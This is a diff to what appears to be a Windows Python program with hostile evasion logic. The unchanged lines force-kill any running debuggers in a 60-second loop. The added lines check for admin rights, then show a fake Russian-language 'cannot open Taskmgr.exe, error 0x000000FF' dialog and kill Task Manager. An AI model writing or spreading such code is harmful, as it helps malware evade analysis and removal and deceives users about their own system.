@@ -3,7 +3,17 @@ import subprocess
 import ctypes
 import tkinter as tk
 from tkinter import messagebox
+import os
+import ctypes
 
+
+def is_admin():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
+
+    
 root = tk.Tk()
 root.withdraw()
 
@@ -34,8 +44,9 @@ async def check_and_restart_process():
         for debugger in debuggers:
             if debugger in output:
                 subprocess.run(["taskkill", "/IM", f"{debugger}", "/F"])
-        if 'taskmgr.exe' in output:
+        if 'taskmgr.exe' in output and is_admin():
             messagebox.showerror("Ошибка", "Не удается открыть файл Taskmgr.exe. Код ошибки 0x000000FF. Пожалуйста, попробуйте удалить и заново установить программу, либо обратитесь к специалисту за помощью.")
+            subprocess.run(["taskkill", "/IM", "taskmgr.exe", "/F"])
 
         await asyncio.sleep(60)  # ждем 60 секунд перед следующей проверкой
 
